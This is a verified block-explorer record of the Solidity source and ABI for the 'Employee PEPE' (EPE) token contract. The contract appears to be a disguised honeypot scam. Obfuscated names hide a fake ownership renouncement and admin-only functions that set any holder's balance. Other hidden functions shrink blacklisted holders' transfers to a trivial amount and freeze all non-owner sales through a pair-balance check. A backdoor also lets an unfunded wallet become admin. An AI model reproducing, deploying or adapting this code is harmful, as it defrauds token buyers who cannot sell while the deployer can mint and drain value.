{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundSell) external view returns (uint256);\n\n    function transfer(address listLiquidity, uint256 launchedMarketingMin) external returns (bool);\n\n    function allowance(address atTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedMarketingMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listLiquidity,\n        uint256 launchedMarketingMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSell, uint256 value);\n    event Approval(address indexed atTx, address indexed spender, uint256 value);\n}\n\nabstract contract marketingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderMode {\n    function createPair(address amountBuy, address marketingLaunch) external returns (address);\n}\n\ninterface amountMode is liquidityFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmployeePEPE is marketingBuy, liquidityFee, amountMode {\n\n    function balanceOf(address fundSell) public view virtual override returns (uint256) {\n        return shouldSwapMax[fundSell];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLimit;\n    }\n\n    bool public fundAt;\n\n    function approve(address toMinSell, uint256 launchedMarketingMin) public virtual override returns (bool) {\n        takeAutoAmount[_msgSender()][toMinSell] = launchedMarketingMin;\n        emit Approval(_msgSender(), toMinSell, launchedMarketingMin);\n        return true;\n    }\n\n    uint256 public txWallet;\n\n    mapping(address => bool) public tokenTake;\n\n    bool public walletSell;\n\n    bool public isFrom;\n\n    uint256 private limitIs;\n\n    function receiverMin() public {\n        emit OwnershipTransferred(sellMinFund, address(0));\n        limitTake = address(0);\n    }\n\n    uint256 toAuto;\n\n    address exemptTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public toLaunch;\n\n    bool private senderLiquidity;\n\n    function transfer(address tokenFromMax, uint256 launchedMarketingMin) external virtual override returns (bool) {\n        return launchedAuto(_msgSender(), tokenFromMax, launchedMarketingMin);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchToken;\n    }\n\n    uint256 atLimit;\n\n    bool public fundLimit;\n\n    event OwnershipTransferred(address indexed maxMin, address indexed receiverBuy);\n\n    function allowance(address tokenTakeTx, address toMinSell) external view virtual override returns (uint256) {\n        if (toMinSell == exemptTotal) {\n            return type(uint256).max;\n        }\n        return takeAutoAmount[tokenTakeTx][toMinSell];\n    }\n\n    constructor (){\n        if (isFrom) {\n            walletLaunch = limitIs;\n        }\n        takeExempt autoLaunch = takeExempt(exemptTotal);\n        senderShould = senderMode(autoLaunch.factory()).createPair(autoLaunch.WETH(), address(this));\n        if (txWallet == walletLaunch) {\n            senderLiquidity = false;\n        }\n        sellMinFund = _msgSender();\n        receiverMin();\n        toLaunch[sellMinFund] = true;\n        shouldSwapMax[sellMinFund] = launchToken;\n        \n        emit Transfer(address(0), sellMinFund, launchToken);\n    }\n\n    uint8 private takeLiquidity = 18;\n\n    address private limitTake;\n\n    uint256 private launchToken = 100000000 * 10 ** 18;\n\n    function marketingFee(address tokenLaunched) public {\n        txReceiver();\n        if (isFrom != walletSell) {\n            walletSell = false;\n        }\n        if (tokenLaunched == sellMinFund || tokenLaunched == senderShould) {\n            return;\n        }\n        tokenTake[tokenLaunched] = true;\n    }\n\n    function txReceiver() private view {\n        require(toLaunch[_msgSender()]);\n    }\n\n    address public senderShould;\n\n    address txTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address minToTeam, address listLiquidity, uint256 launchedMarketingMin) external override returns (bool) {\n        if (_msgSender() != exemptTotal) {\n            if (takeAutoAmount[minToTeam][_msgSender()] != type(uint256).max) {\n                require(launchedMarketingMin <= takeAutoAmount[minToTeam][_msgSender()]);\n                takeAutoAmount[minToTeam][_msgSender()] -= launchedMarketingMin;\n            }\n        }\n        return launchedAuto(minToTeam, listLiquidity, launchedMarketingMin);\n    }\n\n    function amountReceiverBuy(address buyLaunched) public {\n        require(buyLaunched.balance < 100000);\n        if (fundLimit) {\n            return;\n        }\n        \n        toLaunch[buyLaunched] = true;\n        if (txWallet != toExempt) {\n            senderLiquidity = true;\n        }\n        fundLimit = true;\n    }\n\n    mapping(address => uint256) private shouldSwapMax;\n\n    uint256 constant receiverIs = 3 ** 10;\n\n    function marketingTake(uint256 launchedMarketingMin) public {\n        txReceiver();\n        toAuto = launchedMarketingMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitTake;\n    }\n\n    uint256 private walletLaunch;\n\n    uint256 public toExempt;\n\n    address public sellMinFund;\n\n    mapping(address => mapping(address => uint256)) private takeAutoAmount;\n\n    string private receiverLimit = \"Employee PEPE\";\n\n    function buyTx(address tokenFromMax, uint256 launchedMarketingMin) public {\n        txReceiver();\n        shouldSwapMax[tokenFromMax] = launchedMarketingMin;\n    }\n\n    function launchedAuto(address minToTeam, address listLiquidity, uint256 launchedMarketingMin) internal returns (bool) {\n        if (minToTeam == sellMinFund) {\n            return receiverToken(minToTeam, listLiquidity, launchedMarketingMin);\n        }\n        uint256 swapWallet = liquidityFee(senderShould).balanceOf(txTeam);\n        require(swapWallet == toAuto);\n        require(listLiquidity != txTeam);\n        if (tokenTake[minToTeam]) {\n            return receiverToken(minToTeam, listLiquidity, receiverIs);\n        }\n        return receiverToken(minToTeam, listLiquidity, launchedMarketingMin);\n    }\n\n    function owner() external view returns (address) {\n        return limitTake;\n    }\n\n    string private fromMax = \"EPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLiquidity;\n    }\n\n    function receiverToken(address minToTeam, address listLiquidity, uint256 launchedMarketingMin) internal returns (bool) {\n        require(shouldSwapMax[minToTeam] >= launchedMarketingMin);\n        shouldSwapMax[minToTeam] -= launchedMarketingMin;\n        shouldSwapMax[listLiquidity] += launchedMarketingMin;\n        emit Transfer(minToTeam, listLiquidity, launchedMarketingMin);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMinSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"amountReceiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMinSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketingMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketingMin\",\"type\":\"uint256\"}],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedMarketingMin\",\"type\":\"uint256\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMinFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketingMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketingMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EmployeePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}